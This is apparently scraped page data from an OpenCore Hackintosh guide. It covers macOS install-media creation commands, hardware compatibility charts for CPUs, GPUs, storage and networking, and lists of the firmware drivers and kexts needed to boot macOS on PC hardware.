show all devices (alternatively you can press the View button)\n * Note 3: Users following \"Legacy macOS: Online Method\" section can skip to Setting up OpenCore's EFI environment\n\n\n\nNext run the createinstallmedia command provided by Apple. Note that the command is made for USB's formatted with the name MyVolume:\n\nsudo /Applications/Install\\ macOS\\ Big\\ Sur.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n\nNote for users on Apple Silicon installing macOS older than Big Sur\n\nIf the createinstallmedia fails with zsh: killed or Killed: 9 then it's most likely an issue with the installer's code signature. To fix this, you can run the following command:\n\ncd /Applications/Install\\ macOS\\ Big\\ Sur.app/Contents/Resources/\ncodesign -s - -f --deep /Applications/Install\\ macOS\\ Big\\ Sur.app\n\n\nYou will need the command line tools for Xcode installed:\n\nxcode-select --install\n\n\nThis will take some time so you may want to grab a coffee or continue reading the guide (to be fair you really shouldn't be following this guide step by step without reading the whole thing first).\n\nYou can also replace the createinstallmedia path with that of where your installer's located (same idea with the drive name).\n\nLegacy createinstallmedia Commands\n\nPulled from Apple's own site: How to create a bootable installer for macOS\n\n# Ventura\nsudo /Applications/Install\\ macOS\\ Ventura.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n# Monterey\nsudo /Applications/Install\\ macOS\\ Monterey.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n# Big Sur\nsudo /Applications/Install\\ macOS\\ Big\\ Sur.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n# Catalina\nsudo /Applications/Install\\ macOS\\ Catalina.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n# Mojave\nsudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n# High Sierra\nsudo /Applications/Install\\ macOS\\ High\\ Sierra.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume\n\n# Sierra\nsudo /Applications/Install\\ macOS\\ Sierra.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume --applicationpath /Applications/Install\\ macOS\\ Sierra.app\n\n# El Capitan\nsudo /Applications/Install\\ OS\\ X\\ El\\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume --applicationpath /Applications/Install\\ OS\\ X\\ El\\ Capitan.app\n\n# Yosemite\nsudo /Applications/Install\\ OS\\ X\\ Yosemite.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume --applicationpath /Applications/Install\\ OS\\ X\\ Yosemite.app\n\n# Mavericks\nsudo /Applications/Install\\ OS\\ X\\ Mavericks.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume --applicationpath /Applications/Install\\ OS\\ X\\ Mavericks.app --nointeraction\n\n\n\n# Legacy Setup\n\nFor systems not supporting UEFI boot, see below:\n\nSetting up Legacy Boot\n\nTo start, you need the following:\n\n * BootInstall_IA32.tool or BootInstall_X64.tool\n   * This can be found in OpenCorePkg under /Utilties/LegacyBoot/\n * Install USB(Created above)\n\nWithin your OpenCore build folder, navigate to Utilities/LegacyBoot.

Limitations\n\nWith macOS, there are numerous hardware limitations you need to be aware of before stepping foot into an installation. This is due to the limited amount of hardware Apple supports, so we're either limited by Apple or what patches the community has created.\n\nThe main hardware sections to verify are:\n\n\n\n * CPU Support\n * GPU Support\n * Motherboard Support\n * Storage Support\n * Wired Networking\n * Wireless Networking\n * Miscellaneous\n\n\n\nAnd for more detailed guides on the subject, see here:\n\n * GPU Buyers Guide\n   * Check if your GPU is supported and which macOS version you can run.\n * Wireless Buyers Guide\n   * Check if your WiFi card is supported.\n * Anti-Hardware Buyers Guide\n   * Overall guide on what to avoid and what pitfalls your hardware may hit.\n\n\n# CPU Support\n\nFor CPU support, we have the following breakdown:\n\n * Both 32 and 64-bit CPUs are supported\n   * This however requires the OS to support your architecture, see CPU Requirements section below\n * Intel's Desktop CPUs are supported.\n   * Yonah through Comet Lake are supported by this guide.\n * Intel's High-End Desktops and Server CPUs.\n   * Nehalem through Cascade Lake X are supported by this guide.\n * Intel's Core \"i\" and Xeon series laptop CPUs\n   * Arrandale through Ice Lake are supported by this guide.\n   * Note that Mobile Atoms, Celeron and Pentium CPUs are not supported\n * AMD's Desktop Bulldozer (15h), Jaguar (16h) and Ryzen (17h) CPUs\n   * Laptop CPUs are not supported\n   * Note not all features of macOS are supported with AMD, see below\n\nFor more in-depth information, see here: Anti-Hardware Buyers Guide\n\nCPU Requirements\n\nArchitecture Requirements\n\n * 32-bit CPUs are supported from 10.4.1 to 10.6.8\n   * Note that 10.7.x requires 64-bit userspace, limiting 32-bit CPUs to 10.6\n * 64-bit CPUs are supported from 10.4.1 to current\n\nSSE Requirements:\n\n * SSE3 is required for all Intel versions of OS X/macOS\n * SSSE3 is required for all 64-bit versions of OS X/macOS\n   * For CPUs missing SSSE3 (i.e. certain 64-bit Pentiums), we recommend running 32-bit userspace (i386-user32)\n * SSE4 is required for macOS 10.12 and newer\n * SSE4.2 is required for macOS 10.14 and newer\n   * SSE4.1 CPUs are supported with telemetrap.kext\n   * Newer AMD drivers also require SSE4.2 for Metal support. To resolve this, see here: MouSSE: SSE4.2 emulation\n\nFirmware Requirements:\n\n * OS X 10.4.1 through 10.4.7 require EFI32 (i.e. IA32 (32-bit) version of OpenCore)\n   * OS X 10.4.8 through 10.7.5 support both EFI32 and EFI64\n * OS X 10.8 and newer require EFI64 (i.e. x64 (64-bit) version of OpenCore)\n * OS X 10.7 through 10.9 require OpenPartitionDxe.efi to boot the Recovery partition\n\nKernel Requirements:\n\n * OS X 10.4 and 10.5 require 32-bit kexts due to only supporting 32-bit kernelspace\n   * OS X 10.6 and 10.7 support both 32 and 64-bit kernelspace\n * OS X 10.8 and newer require 64-bit kexts due to only supporting 64-bit kernelspace\n   * Run lipo -archs to know what architectures your kext supports (remember to run this on the binary itself and not the .kext bundle)\n\nCore/Thread Count Limits:\n\n * OS X 10.10 and below may not boot with more than 24 threads (evident by a mp_cpus_call_wait() timeout panic)\n * OS X 10.11 and newer have a 64 thread limit\n * cpus= boot argument can be used as a workaround, or disabling hyperthreading\n\nSpecial Notes:\n\n * Lilu and plugins require 10.8 or newer to operate\n   * We recommend running FakeSMC for older versions of OS X\n * OS X 10.6 and older require RebuildAppleMemoryMap enabled\n   * This is to resolve an early kernel\n\nIntel CPU Support Chart\n\nSupport based off of Vanilla Kernels (i.e. no modifications):\n\nCPU GENERATION                   INITIAL SUPPORT   LAST SUPPORTED VERSION   NOTES                       CPUID\nPentium 4                        10.4.1            10.5.8                   Only used in dev kits       0x0F41\nYonah                            10.4.4            10.6.8                   32-Bit                      0x0006E6\nConroe, Merom                    10.4.7            10.11.6                  No SSE4                     0x0006F2\nPenryn                           10.4.10           10.13.6                  No SSE4.2                   0x010676\nNehalem                          10.5.6            Current                  N/A                         0x0106A2\nLynnfield, Clarksfield           10.6.3                                     No iGPU support 10.14+      0x0106E0\nWestmere, Clarkdale, Arrandale   10.6.4                                                                 0x0206C0\nSandy Bridge                     10.6.7                                                                 0x0206A0(M/H)\nIvy Bridge                       10.7.3                                     No iGPU support 12+         0x0306A0(M/H/G)\nIvy Bridge-E5                    10.9.2                                     N/A                         0x0306E0\nHaswell                          10.8.5                                                                 0x0306C0(S)\nBroadwell                        10.10.0                                                                0x0306D4(U/Y)\nSkylake                          10.11.0                                                                0x0506e3(H/S) 0x0406E3(U/Y)\nKaby Lake                        10.12.4                                                                0x0906E9(H/S/G) 0x0806E9(U/Y)\nCoffee Lake                      10.12.6                                                                0x0906EA(S/H/E) 0x0806EA(U)\nAmber, Whiskey, Comet Lake       10.14.1                                                                0x0806E0(U/Y)\nComet Lake                       10.15.4                                                                0x0906E0(S/H)\nIce Lake                                                                                                0x0706E5(U)\nRocket Lake                                                                 Requires Comet Lake CPUID   0x0A0671\nTiger Lake                       N/A               N/A                      Untested                    0x0806C0(U)\n\nAMD CPU Limitations in macOS\n\nUnfortunately many features in macOS are outright unsupported with AMD and many others being partially broken. These include:\n\n * Virtual Machines relying on AppleHV\n   * This includes VMWare, Parallels, Docker, Android Studio, etc\n   * VirtualBox is the sole exception as they have their own hypervisor\n   * VMware 10 and Parallels 13.1.0 do support their own hypervisor, however using such outdated VM software poses a large security threat\n * Adobe Support\n   * Most of Adobe's suite relies on Intel's Memfast instruction set, resulting in crashes with AMD CPUs\n   * You can disable functionality like RAW support to avoid the crashing: Adobe Fixes\n * 32-Bit support\n   * For those still relying on 32-Bit software in Mojave and below, note that the Vanilla patches do not support 32-bit instructions\n   * A work-around is to install a custom kernel, however you lose iMessage support and no support is provided for these kernels\n * Stability issues on many apps\n   * Audio-based apps are the most prone to issues, ie. Logic Pro\n   * DaVinci Resolve has been known to have sporadic issues as well\n\n\n# GPU Support\n\nGPU support becomes much more complicated due to the near-infinite amount of GPUs on the market, but the general breakdown is as follows:\n\n * AMD's GCN based GPUs are supported in the latest versions of macOS\n   * AMD APUs are not supported however\n   * AMD's Lexa based cores from the Polaris series are also not supported\n   * Special note for MSI Navi users: Installer not working with 5700XT #901\n     * This issue is no longer present in macOS 11 (Big Sur).\n * NVIDIA's GPU support is complicated:\n   * Maxwell(9XX) and Pascal(10XX) GPUs are limited to macOS 10.13: High Sierra\n   * NVIDIA's Turing(20XX,16XX) GPUs are not supported in any version of macOS\n   * NVIDIA's Ampere(30XX) GPUs are not supported in any version of macOS\n   * NVIDIA's Kepler(6XX,7XX) GPUs are supported up to macOS 11: Big Sur\n * Intel's GT2+ tier series iGPUs\n   * Ivy Bridge through Ice Lake iGPU support is covered in this guide\n     * Info on GMA series iGPUs can be found here: GMA Patching\n   * Note GT2 refers to the tier of iGPU, low-end GT1 iGPUs found on Pentiums, Celerons and Atoms are not supported in macOS\n\nAnd an important note for Laptops with discrete GPUs:\n\n * 90% of discrete GPUs will not work because they are wired in a configuration that macOS doesn't support (switchable graphics). With NVIDIA discrete GPUs, this is usually called Optimus. It is not possible to utilize these discrete GPUs for the internal display, so it is generally advised to disable them and power them off (will be covered later in this guide).\n * However, in some cases, the discrete GPU powers any external outputs (HDMI, mini DisplayPort, etc.), which may or may not work; in the case that it will work, you will have to keep the card on and running.\n * However, there are some laptops that rarely do not have switchable graphics, so the discrete card can be used (if supported by macOS), but the wiring and setup usually cause issues.\n\nFor a full list of supported GPUs, see the GPU Buyers Guide\n\nIntel GPU Support Chart\n\nGPU GENERATION           INITIAL SUPPORT   LAST SUPPORTED VERSION   NOTES\n3rd Gen GMA              10.4.1            10.7.5                   Requires 32-bit kernel and patches\n4th Gen GMA              10.5.0\nArrandale(HD Graphics)   10.6.4            10.13.6                  Only LVDS is supported, eDP and external outputs are not\nSandy Bridge(HD 3000)    10.6.7                                     N/A\nIvy Bridge(HD 4000)      10.7.3            11.7.x\nHaswell(HD 4XXX, 5XXX)   10.8.5            12.6.x\nBroadwell(5XXX, 6XXX)    10.10.0\nSkylake(HD 5XX)          10.11.0\nKaby Lake(HD 6XX)        10.12.4           Current\nCoffee Lake(UHD 6XX)     10.13.6\nComet Lake(UHD 6XX)      10.15.4\nIce Lake(Gx)             10.15.4                                    Requires -igfxcdc and -igfxdvmt in boot-args\nTiger Lake(Xe)           N/A               N/A                      No drivers available\nRocket Lake              N/A               N/A                      No drivers available\n\nAMD GPU Support Chart\n\nGPU GENERATION   INITIAL SUPPORT   LAST SUPPORTED VERSION   NOTES\nX800             10.3.x            10.7.5                   Requires 32 bit kernel\nX1000            10.4.x                                     N/A\nTeraScale        10.4.x            10.13.6\nTeraScale 2/3    10.6.x\nGCN 1            10.8.3            12.6.x\nGCN 2/3          10.10.x\nPolaris 10, 20   10.12.1           Current\nVega 10          10.12.6\nVega 20          10.14.5\nNavi 10          10.15.1                                    Requires agdpmod=pikera in boot-args\nNavi 20          11.4                                       Currently only some Navi 21 models are working\n\nNVIDIA GPU Support Chart\n\nGPU GENERATION   INITIAL SUPPORT   LAST SUPPORTED VERSION   NOTES\nGeForce 6        10.2.x            10.7.5                   Requires 32 bit kernel and NVCAP patching\nGeForce 7        10.4.x                                     Requires NVCAP patching\nTesla            10.4.x            10.13.6\nTesla v2         10.5.x\nFermi            10.7.x\nKepler           10.7.x            11.7.x                   N/A\nKepler v2        10.8.x\nMaxwell          10.10.x           10.13.6                  Requires NVIDIA Web Drivers\nPascal           10.12.4\nTuring           N/A               N/A                      No drivers available\nAmpere\n\n\n# Motherboard Support\n\nFor the most part, all motherboards are supported as long as the CPU is.\n\nMSI 500-series AMD motherboards note\n\nThe exception is MSI 500-series AMD motherboards (A520, B550, and X570). These motherboards have issues with macOS Monterey and above:\n\n * PCIe devices are not always enumerated properly\n * The BIOS update for Zen 3 support breaks boot\n\nmacOS Big Sur or earlier is recommended for these motherboards.\n\nThanks to CaseySJ, this has been fixed in the latest version of the AMD vanilla patches!\n\n\n# Storage Support\n\nFor the most part, all SATA based drives are supported and the majority of NVMe drives as well. There are only a few exceptions:\n\n * Samsung PM981, PM991 and Micron 2200S NVMe SSDs\n   \n   * These SSDs are not compatible out of the box (causing kernel panics) and therefore require NVMeFix.kext to fix these kernel panics. Note that these drives may still cause boot issues even with NVMeFix.kext.\n   * On a related note, Samsung 970 EVO Plus NVMe SSDs also had the same problem but it was fixed in a firmware update; get the update (Windows via Samsung Magician or bootable ISO) here.\n   * Also to note, laptops that use Intel Optane Memory or Micron 3D XPoint for HDD acceleration are unsupported in macOS. Some users have reported success in Catalina with even read and write support but we highly recommend removing the drive to prevent any potential boot issues.\n     * Note that Intel Optane Memory H10/H20 models are compatible if the Optane part is disabled in macOS. More information can be found here (original Chinese source).\n\n * Intel 600p\n   \n   * While not unbootable, please be aware this model can cause numerous problems. Any fix for Intel 600p NVMe Drive? #1286\n   * The 660p model is fine\n\n\n# Wired Networking\n\nVirtually all wired network adapters have some form of support in macOS, either by the built-in drivers or community made kexts. The main exceptions:\n\n * Intel I225 2.5Gb NIC\n   * Found on high-end Desktop Comet Lake boards\n   * Workarounds are possible: Source and Example\n * Intel I350 1Gb server NIC\n   * Normally found on Intel and Supermicro server boards of various generations\n   * Workaround\n * Intel 10Gb server NICs\n   * Workarounds are possible for X520 and X540 chipsets\n * Mellanox and Qlogic server NICs\n\n\n# Wireless Networking\n\nMost WiFi cards that come with laptops are not supported as they are usually Intel/Qualcomm. If you are lucky, you may have a supported Atheros card, but support only runs up to High Sierra.\n\nThe best option is getting a supported Broadcom card; see the WiFi Buyer's Guide for recommendations.\n\nNote: Intel WiFi is unofficially (3rd party driver) supported on macOS, check WiFi Buyer's Guide for more information about the drivers and supported cards.\n\n\n# Miscellaneous\n\n * Fingerprint sensors\n   * There is currently no way to emulate the Touch ID sensor, so fingerprint sensors will not work.\n * Windows Hello Face Recognition\n   * Some laptops come with WHFR that is I2C connected (and used through your iGPU), those will not work.\n   * Some laptops come with WHFR that is USB connected, if you're lucky, you may get camera functionality, but nothing else.\n * Intel Smart Sound Technology\n   * Laptops with Intel SST will not have anything connected through them (usually internal mic) work, as it is not supported. You can check with Device Manager on Windows.\n * Headphone Jack Combo\n   * Some laptops with a combo headphone jack may not get audio input through them and will have to either use the built-in microphone or an external audio input device through USB.\n * Thunderbolt USB-C ports\n   * (Hackintosh) Thunderbolt support is currently still iffy in macOS, even more so with Alpine Ridge controllers, which most current laptops have. There have been attempts to keep the controller powered on, which allows Thunderbolt and USB-C hotplug to work, but it comes at the cost of kernel panics and/or USB-C breaking after sleep. If you want to use the USB-C side of the port and be able to sleep, you must plug it in at boot and keep it plugged in.\n   * Note: This does not apply to USB-C only ports - only Thunderbolt 3 and USB-C combined ports.\n   * Disabling Thunderbolt in the BIOS will also resolve this.",normalizedContent:"# hardware limitations\n\nwith macos, there are numerous hardware limitations you need to be

opencore)\n * os x 10.7 through 10.9 require openpartitiondxe.efi to boot the recovery partition\n\nkernel requirements:\n\n * os x 10.4 and 10.5 require 32-bit kexts due to only supporting 32-bit kernelspace\n   * os x 10.6 and 10.7 support both 32 and 64-bit kernelspace\n * os x 10.8 and newer require 64-bit kexts due to only supporting 64-bit kernelspace\n   * run lipo -archs to know what architectures your kext supports (remember to run this on the binary itself and not the .kext bundle)\n\ncore/thread count limits:\n\n * os x 10.10 and below may not boot with more than 24 threads (evident by a mp_cpus_call_wait() timeout panic)\n * os x 10.11 and newer have a 64 thread limit\n * cpus= boot argument can be used as a workaround, or disabling hyperthreading\n\nspecial notes:\n\n * lilu and plugins require 10.8 or newer to operate\n   * we recommend running fakesmc for older versions of os x\n * os x 10.6 and older require rebuildapplememorymap enabled\n   * this is to resolve an early kernel\n\nintel cpu support chart\n\nsupport based off of vanilla kernels (i.e. no modifications):\n\ncpu generation                   initial support   last supported version   notes

relying on applehv\n   * this includes vmware, parallels, docker, android studio, etc\n   * virtualbox is the sole exception as they have their own hypervisor\n   * vmware 10 and parallels 13.1.0 do support their own hypervisor, however using such outdated vm software poses a large security threat\n * adobe support\n   * most of adobe's suite relies on intel's memfast instruction set, resulting in crashes with amd cpus\n   * you can disable functionality like raw support to avoid the crashing: adobe fixes\n * 32-bit support\n   * for those still relying on 32-bit software in mojave and below, note that the vanilla patches do not support 32-bit instructions\n   * a work-around is to install a custom kernel, however you lose imessage support and no support is provided for these kernels\n * stability issues on many apps\n   * audio-based apps are the most prone to issues, ie. logic pro\n   * davinci resolve has been known to have sporadic issues as well\n\n\n# gpu support\n\ngpu support becomes much more complicated due to the near-infinite amount of gpus on the market, but the general breakdown is as follows:\n\n * amd's gcn based gpus are supported in the latest versions of macos\n   * amd apus are not supported however\n   * amd's lexa based cores from the polaris series are also not supported\n   * special note for msi navi users: installer not working with 5700xt #901\n     * this issue is no longer present in macos 11 (big sur).\n * nvidia's gpu support is complicated:\n   * maxwell(9xx) and pascal(10xx) gpus are limited to macos 10.13: high sierra\n   * nvidia's turing(20xx,16xx) gpus are not supported in any version of macos\n   * nvidia's ampere(30xx) gpus are not supported in any version of macos\n   * nvidia's kepler(6xx,7xx) gpus are supported up to macos 11: big sur\n * intel's gt2+ tier series igpus\n   * ivy bridge through ice lake igpu support is covered in this guide\n     * info on gma series igpus can be found here: gma patching\n   * note gt2 refers to the tier of igpu, low-end gt1 igpus found on pentiums, celerons and atoms are not supported in macos\n\nand an important note for laptops with discrete gpus:\n\n * 90% of discrete gpus will not work because they are wired in a configuration that macos doesn't support (switchable graphics). with nvidia discrete gpus, this is usually called optimus. it is not possible to utilize these discrete gpus for the internal display, so it is generally advised to disable them and power them off (will be covered later in this guide).\n * however, in some cases, the discrete gpu powers any external outputs (hdmi, mini displayport, etc.), which may or may not work; in the case that it will work, you will have to keep the card on and running.\n * however, there are some laptops that rarely do not have switchable graphics, so the discrete card can be used (if supported by macos), but the wiring and setup usually cause issues.\n\nfor a full list

note\n\nthe exception is msi 500-series amd motherboards (a520, b550, and x570). these motherboards have issues with macos monterey and above:\n\n * pcie devices are not always enumerated properly\n * the bios update for zen 3 support breaks boot\n\nmacos big sur or earlier is recommended for these motherboards.\n\nthanks to caseysj, this has been fixed in the latest version of the amd vanilla patches!\n\n\n# storage support\n\nfor the most part, all sata based drives are supported and the majority of nvme drives as well. there are only a few exceptions:\n\n * samsung pm981, pm991 and micron 2200s nvme ssds\n   \n   * these ssds are not compatible out of the box (causing kernel panics) and therefore require nvmefix.kext to fix these kernel panics. note that these drives may still cause boot issues even with nvmefix.kext.\n   * on a related note, samsung 970 evo plus nvme ssds also had the same problem but it was fixed in a firmware update; get the update (windows via samsung magician or bootable iso) here.\n   * also to note, laptops that use intel optane memory or micron 3d xpoint for hdd acceleration are unsupported in macos. some users have reported success in catalina with even read and write support but we highly recommend removing the drive to prevent any potential boot issues.\n     * note that intel optane memory h10/h20 models are compatible if the optane part is disabled in macos. more information can be found here (original chinese source).\n\n * intel 600p\n   \n   * while not unbootable, please be aware this model can cause numerous problems. any fix for intel 600p nvme drive? #1286\n   * the 660p model is fine\n\n\n# wired networking\n\nvirtually all wired network adapters have some form of support in macos, either by the built-in drivers or community made kexts. the main exceptions:\n\n * intel i225 2.5gb nic\n   * found on high-end desktop comet lake boards\n   * workarounds are possible: source and example\n * intel i350 1gb server nic\n   * normally found on intel and supermicro server boards of various generations\n   * workaround\n * intel 10gb server nics\n   * workarounds are possible for x520 and x540 chipsets\n * mellanox and qlogic server nics\n\n\n# wireless networking\n\nmost wifi cards that come with laptops are not supported as they are usually intel/qualcomm. if you are lucky, you may have a supported atheros card, but support only runs up to high sierra.\n\nthe best option is getting a supported broadcom card; see the wifi buyer's guide for recommendations.\n\nnote: intel wifi is unofficially (3rd party driver) supported on macos, check wifi buyer's guide for more information about the drivers and supported cards.\n\n\n# miscellaneous\n\n * fingerprint sensors\n   * there is currently no way to emulate the touch id sensor, so fingerprint sensors will not work.\n * windows hello face recognition\n   * some laptops come with whfr that is i2c connected (and used through your igpu), those will not work.\n   * some laptops come with whfr that is usb connected, if you're lucky, you may get camera functionality, but nothing else.\n * intel smart sound technology\n   * laptops with intel sst will not have anything connected through them (usually internal mic) work, as it is not supported. you can check with device manager on windows.\n * headphone jack combo\n   * some laptops with a combo headphone jack may not get audio input through them and will have to either use the built-in microphone or an external audio input device through usb.\n * thunderbolt usb-c ports\n   * (hackintosh) thunderbolt support is currently still iffy in macos, even more so with alpine ridge controllers, which most current laptops have. there have been attempts to keep the controller powered on, which allows thunderbolt and usb-c hotplug to work, but it comes at the cost of kernel panics and/or usb-c breaking after sleep. if you want to use the usb-c side of the port and be able to sleep, you must plug it in at boot and keep it plugged in.\n   * note: this does not apply to usb-c only ports - only thunderbolt 3 and usb-c combined ports.\n   * disabling thunderbolt in the bios will also resolve this.",charsets:{}},{title:"Gathering files",frontmatter:{},regularPath:"/ktext.html",relativePath:"ktext.md",key:"v-2d36c3cd",path:"/ktext.html",headers:[{level:2,title:"Firmware

well before starting and hopefully made a Hackintosh before as we won't be deep diving in here.\n\n> What's the best way to figure out if my hardware is supported?\n\nSee the Hardware Limitations page

drivers used by OpenCore in the UEFI environment. They're mainly required to boot a machine, either by extending OpenCore's patching ability or showing you different types of drives in the OpenCore picker(ie. HFS drives).\n\n * Location Note: These files must be placed under EFI/OC/Drivers/\n\n\n# Universal\n\nRequired Drivers\n\nFor the majority of systems, you'll only need 2 .efi drivers to get up and running:\n\n * HfsPlus.efi(Required)\n   * Needed for seeing HFS volumes(ie. macOS Installers and Recovery partitions/images). Do not mix other HFS drivers\n   * For Sandy Bridge and older(as well as low end Ivy Bridge(i3 and Celerons), see the legacy section below\n * OpenRuntime.efi(Required)\n   * Replacement for AptioMemoryFix.efi, used as an extension for OpenCore to help with patching boot.efi for NVRAM fixes and better memory management.\n   * Reminder this was bundled in OpenCorePkg we downloaded earlier\n\n\n# Legacy users\n\nIn addition to the above, if your hardware doesn't support UEFI(2011 and older era) then you'll need the following. Pay close attention to each entry as you may not need all 4:\n\n * OpenUsbKbDxe.efi\n   * Used for OpenCore picker on legacy systems running DuetPkg, not recommended and even harmful on UEFI(Ivy Bridge and newer)\n * HfsPlusLegacy.efi\n   * Legacy variant of HfsPlus, used for systems that lack RDRAND instruction support.

They're only for debugging purposes.\n * Location Note: These files must be placed under EFI/OC/Kexts/.\n\nMost kexts listed below can be found pre-compiled in the build repo.

high end desktop\n   * laptop\n\n\n\n\n# firmware drivers\n\nfirmware drivers are drivers used by opencore in the uefi environment. they're mainly required to boot a machine, either by extending opencore's patching ability or showing you different types of drives in the opencore picker(ie. hfs drives).\n\n * location note: these files must be placed under efi/oc/drivers/\n\n\n# universal\n\nrequired drivers\n\nfor the majority of systems, you'll only need 2 .efi drivers to get up and running:\n\n * hfsplus.efi(required)\n   * needed for seeing hfs volumes(ie. macos installers and recovery partitions/images). do not mix other hfs drivers\n   * for sandy bridge and older(as well as low end ivy bridge(i3 and celerons), see the legacy section below\n * openruntime.efi(required)\n   * replacement for aptiomemoryfix.efi, used as an extension for opencore to help with patching boot.efi for nvram fixes and better memory management.\n   * reminder this was bundled in opencorepkg we downloaded earlier\n\n\n# legacy users\n\nin addition to the above, if your hardware doesn't support uefi(2011 and older era) then you'll need the following. pay close attention to each entry as you may not need all 4:\n\n * openusbkbdxe.efi\n   * used for opencore picker on legacy systems running duetpkg, not recommended and even harmful on uefi(ivy bridge and newer)\n * hfspluslegacy.efi\n   * legacy variant of hfsplus, used for systems that lack rdrand instruction support. this is generally seen on sandy bridge and older(as well as low end ivy bridge(i3 and celerons))\n   * don't mix this with hfsplus.efi, choose one or the other depending on your hardware\n * openpartitiondxe\n   * required to boot recovery on os x 10.7 through 10.9\n     * this file is bundled with opencorepkg under efi/oc/drivers\n     * note: openduet users(ie. without uefi) will have this driver built-in, not requiring it\n   * not required for os x 10.10, yosemite and newer\n\nthese files will go in your drivers folder in your efi\n\n32-bit specifics\n\nfor those with 32-bit cpus, you'll want to grab these drivers as well\n\n * hfsplus32\n   * alternative to hfspluslegacy but for 32-bit cpus, don't mix this with other hfs .efi drivers\n\n\n# kexts\n\na kext is a kernel extension, you can think of this as a driver for macos, these files will go into the kexts folder in your efi.\n\n * windows and linux note: kexts will look like normal folders in your os, double check that the folder you are installing has a .kext extension visible(and do not add one manually if it's missing).\n   * if any kext also includes a .dsym file, you can simply delete it. they're only for debugging purposes.\n * location note: these files must be placed under efi/oc/kexts/.\n\nmost kexts listed below can be found pre-compiled in the build repo. kexts here are compiled each time there's a new commit.\n\n\n# must haves\n\nrequired kexts\n\nwithout the below 2, no system is bootable:\n\n * lilu(required)\n   * a kext to patch many processes, required for applealc, whatevergreen, virtualsmc and many other kexts. without lilu, they will not work.\n   * note that while lilu supports as early as mac os x 10.4, many plugins only work on newer versions.\n * virtualsmc(required)\n   * emulates the smc chip found on real macs, without this macos will not boot\n   * requires mac os x 10.4 or newer\n\n\n# virtualsmc plugins\n\nthe below plugins are not required to boot, and merely add extra functionality to the system like hardware monitoring. unless otherwise specified, these plugins come with virtualsmc\n\ntip\n\nwhile virtualsmc supports 10.4, plugins may require newer versions.\n\n * smcprocessor.kext\n   * used for monitoring intel cpu temperature\n   * not for amd cpu based systems\n   * requires mac os x 10.7 or newer\n * smcamdprocessor\n   * used for monitoring cpu temperature on amd zen-based systems\n   * under active development, potentially unstable\n   * requires amdryzencpupowermanagement (see amd cpu specific kexts)\n   * requires macos 10.13 or newer\n * smcradeongpu\n   * used for monitoring gpu temperature on amd gpu systems\n   * requires radeonsensor from the same repository\n   * requires macos 11 or newer\n * smcsuperio.kext\n   * used for monitoring fan speed\n   * not for amd cpu based systems\n   * requires mac os x 10.6 or newer\n * smclightsensor.kext\n   * used for the ambient light sensor on laptops\n   * do not use if you don't have an ambient light sensor (ie. desktops), can cause issues otherwise\n   * requires mac os x 10.6 or newer\n * smcbatterymanager.kext\n   * used for measuring battery readouts on laptops\n   * do not use on desktops\n   * requires mac os x 10.4 or newer\n * smcdellsensors.kext\n   * allows for finer monitoring and control of the fans on dell machines supporting system management mode (smm)\n   * do not use if you do not have a supported dell machine, mainly dell laptops can benefit from this kext\n   * requires mac os x 10.7 or newer\n\n\n# graphics\n\n * whatevergreen(required)\n   * used for graphics patching, drm fixes, board id checks, framebuffer fixes, etc; all gpus benefit from this kext.\n   * note the ssdt-pnlf.dsl file included is only required for laptops and aios, see getting started with acpi for more info\n   * requires mac os x 10.6 or newer\n\n\n# audio\n\n * applealc\n   * used for applehda patching, allowing support for the majority of on-board sound controllers\n   * applealcu.kext is a pared down version of applealc that only supports digital audio - but you can still use applealc.kext on digital audio-only systems\n   * amd 15h/16h may have issues with applealc and ryzen/threadripper systems rarely have mic support\n   * requires os x 10.4 or newer\n\nlegacy audio kext\n\nfor those who plan to boot 10.7 and older may want to opt for these kexts instead:\n\n * voodoohda\n   \n   * requires os x 10.6 or newer\n\n * voodoohda-fat\n   \n   * similar to the above, however supports 32 and 64-bit kernels so perfect for os x 10.4-5 booting and 32-bit cpus\n\n\n# ethernet\n\nhere we're going to assume you know what ethernet card your system has, reminder that product spec pages will most likely list the type of network card.\n\n * intelmausi\n   * required for the majority of intel nics, chipsets that are based off of i211 will need the smalltreeintel82576 kext\n   * intel's 82578, 82579, i217, i218 and i219 nics are officially supported\n   * requires os x 10.9 or newer, 10.6-10.8 users can use intelsnowmausi instead for older oses\n * appleigb\n   * required for i211 nics running on macos monterey and above\n   * might have instability issues on some nics, recommended to stay on big sur and use smalltree\n   * required for most amd boards running intel nics\n   * requires macos 12 and above\n * smalltreeintel82576\n   * required for i211 nics running on macos versions up to big sur, based off of the smalltree kext but patched to support i211 (doesn't work on macos 12 monterey or above)\n   * required for most amd boards running intel nics\n   * requires os x 10.9-12(v1.0.6), macos 10.13-14(v1.2.5), macos 10.15+(v1.3.0)\n * atherose2200ethernet\n   * required for atheros and killer nics\n   * requires os x 10.8 or newer\n   * note: atheros killer e2500 models are actually realtek based, for these systems please use realtekrtl8111 instead\n * realtekrtl8111\n   * for realtek's gigabit ethernet\n   * requires os x 10.8 and up for versions v2.2.0 and below, macos 10.12 and up for version v2.2.2, macos 10.14 and up for versions v2.3.0 and up\n   * note: sometimes the latest version of the kext might not work properly with your ethernet. if you see this issue, try older versions.\n * lucyrtl8125ethernet\n   * for realtek's 2.5gb ethernet\n   * requires macos 10.15 or newer\n * for intel's i225-v nics, patches are mentioned in the desktop comet lake deviceproperties section. no kext is required.\n   * requires macos 10.15 or newer\n * for intel's i350 nics, patches are mentioned in the hedt sandy and ivy bridge-e deviceproperties section. no kext is required.\n   * requires os x 10.10 or newer\n\nlegacy ethernet kexts\n\nrelevant for either legacy macos installs or older pc hardware.\n\n * appleintele1000e\n   * mainly relevant for 10/100mbe based intel ethernet controllers\n   * requires 10.6 or newer\n * realtekrtl8100\n   * mainly relevant for 10/100mbe based realtek ethernet controllers\n   * requires macos 10.12 or newer with v2.0.0+\n * bcm5722d\n   * mainly relevant for bcm5722 based broadcom ethernet controllers\n   * requires os x 10.6 